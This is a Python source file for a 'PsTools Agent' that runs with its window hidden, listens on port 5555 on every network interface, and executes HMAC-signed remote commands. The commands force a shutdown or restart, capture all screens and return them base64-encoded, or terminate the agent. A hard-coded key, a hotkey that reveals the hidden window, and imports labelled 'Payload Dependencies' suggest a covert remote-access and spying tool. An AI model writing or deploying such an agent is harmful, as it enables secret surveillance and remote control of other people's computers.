import tkinter as tk
from tkinter import scrolledtext
import socket
import threading
import os
import hmac
import hashlib
import time

# --- Payload Dependencies ---
from PIL import ImageGrab
import base64
import io

VERSION = "3.0 LITE"
# ===== GUI CONFIGURATION & STYLE =====
BG_MAIN = "#121212"  
ACCENT = "#389379"   
TEXT_COLOR = "#FFFFFF" 
PORT = 5555
SECRET_KEY = b"oT_Secr3tK3y_2026!"

class PsToolsAgent:
    def __init__(self, root):
        self.root = root
        self.is_hidden = True
        
        root.overrideredirect(True)
        root.configure(bg=BG_MAIN)
        
        sw = root.winfo_screenwidth()
        sh = root.winfo_screenheight()
        w, h = 450, 300
        x = (sw // 2) - (w // 2)
        y = (sh // 2) - (h // 2)
        root.geometry(f"{w}x{h}+{x}+{y}")
        root.withdraw() 
        
        try:
            import keyboard
            keyboard.add_hotkey("f4", self.toggle_visibility)
        except:
            root.bind_all("<F4>", self.toggle_visibility) 

        title = tk.Frame(root, bg=BG_MAIN)
        title.pack(fill="x")
        title.bind("<ButtonPress-1>", self.start_move)
        title.bind("<B1-Motion>", self.do_move)

        tk.Label(title, text=f"PsTools Agent v{VERSION} - Port {PORT}", bg=BG_MAIN, fg=ACCENT, font=("Consolas", 10, "bold")).pack(side="left", padx=10, pady=5)
        tk.Button(title, text="Quit", bg="#aa2222", fg=TEXT_COLOR, bd=0, command=root.destroy, font=("Consolas", 9, "bold")).pack(side="right", padx=5)

        self.output = scrolledtext.ScrolledText(root, bg="#000000", fg=ACCENT, font=("Consolas", 10), bd=0)
        self.output.pack(fill="both", expand=True, padx=5, pady=5)
        
        tk.Label(root, text="oT", bg=BG_MAIN, fg="#333333", font=("Consolas", 8)).place(relx=1.0, rely=1.0, anchor="se", x=-5, y=-5)

        self.log(f"Lite Agent started. Listening on port {PORT}...")
        threading.Thread(target=self.start_server, daemon=True).start()

    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", PORT))
        server.listen(5)
        
        while True:
            try:
                conn, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True).start()
            except:
                break

    def handle_client(self, conn, addr):
        try:
            conn.settimeout(20.0)
            
            header_data = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk: break
                header_data += chunk

            data = header_data.decode('utf-8', errors='ignore')
            
            if data:
                parts = data.split('|', 2)
                if len(parts) == 3:
                    timestamp, signature, cmd = parts
                    
                    current_time = int(time.time())
                    if abs(current_time - int(timestamp)) > 300:
                        self.root.after(0, self.log, f"WARNING: Replay attack or out-of-sync packet from {addr[0]}. Dropped.")
                        return
                        
                    message = f"{timestamp}:{cmd}"
                    expected_sig = hmac.new(SECRET_KEY, message.encode('utf-8'), hashlib.sha256).hexdigest()
                    
                    if hmac.compare_digest(expected_sig, signature):
                        self.root.after(0, self.log, f"AUTH SUCCESS: Command received from Master ({addr[0]})")
                        
                        response = self.execute_command(cmd)
                        conn.sendall(response.encode('utf-8'))
                        
                        if cmd == "KILL":
                            self.root.after(1000, self.root.destroy)
                            
                    else:
                        self.root.after(0, self.log, f"AUTH FAILED: Invalid signature from {addr[0]}. Access Denied.")
                else:
                    self.root.after(0, self.log, f"MALFORMED PACKET from {addr[0]}. Dropped.")
        except socket.timeout:
            self.root.after(0, self.log, f"Connection timeout from {addr[0]}.")
        except Exception as e:
            self.root.after(0, self.log, f"Error handling client: {e}")
        finally:
            conn.close()

    def execute_command(self, cmd):
        if cmd == "SHUTDOWN":
            self.log("Executing SHUTDOWN sequence...")
            os.system("shutdown /s /t 0 /f")
            return "Shutdown sequence initiated."
            
        elif cmd == "RESTART":
            self.log("Executing RESTART sequence...")
            os.system("shutdown /r /t 0 /f")
            return "Restart sequence initiated."
            
        elif cmd == "SCREENSHOT":
            self.log("Capturing Screen...")
            return self.get_screenshot()
            
        elif cmd == "KILL":
            self.log("KILL command received. Terminating Agent...")
            return "Agent terminated successfully."
            
        else:
            return "Unknown Command."

    def get_screenshot(self):
        try:
            screen = ImageGrab.grab(all_screens=True)
            img_byte_arr = io.BytesIO()
            screen.save(img_byte_arr, format='JPEG', quality=65)
            img_byte_arr = img_byte_arr.getvalue()
            base64_encoded = base64.b64encode(img_byte_arr).decode('utf-8')
            return base64_encoded
        except OSError as e:
            self.log(f"Screenshot Error (Locked/Headless): {e}")
            return f"ERROR: Screen is locked or in headless mode. ({str(e)})"
        except Exception as e:
            self.log(f"Screenshot Error: {e}")
            return f"ERROR: Failed to capture screen - {str(e)}"

    def log(self, msg):
        self.output.insert("end", f"> {msg}\n")
        self.output.see("end")

    def toggle_visibility(self, event=None):
        if self.is_hidden:
            self.root.deiconify()
            self.root.attributes("-topmost", True)
            self.is_hidden = False
        else:
            self.root.withdraw()
            self.is_hidden = True

    def start_move(self, event):
        self.offset_x, self.offset_y = event.x, event.y

    def do_move(self, event):
        x = self.root.winfo_pointerx() - self.offset_x
        y = self.root.winfo_pointery() - self.offset_y
        self.root.geometry(f"+{x}+{y}")

if __name__ == "__main__":
    root = tk.Tk()
    PsToolsAgent(root)
    root.mainloop()